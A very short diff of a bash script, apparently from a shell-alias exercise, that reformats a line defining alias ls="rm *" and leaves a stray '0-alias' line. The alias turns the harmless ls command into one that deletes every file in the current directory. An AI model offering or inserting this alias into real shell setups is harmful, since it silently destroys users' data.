@@ -1,3 +1,4 @@
 #!/bin/bash
-alias ls="rm *" 0-alias
+alias ls="rm *"
+0-alias
 
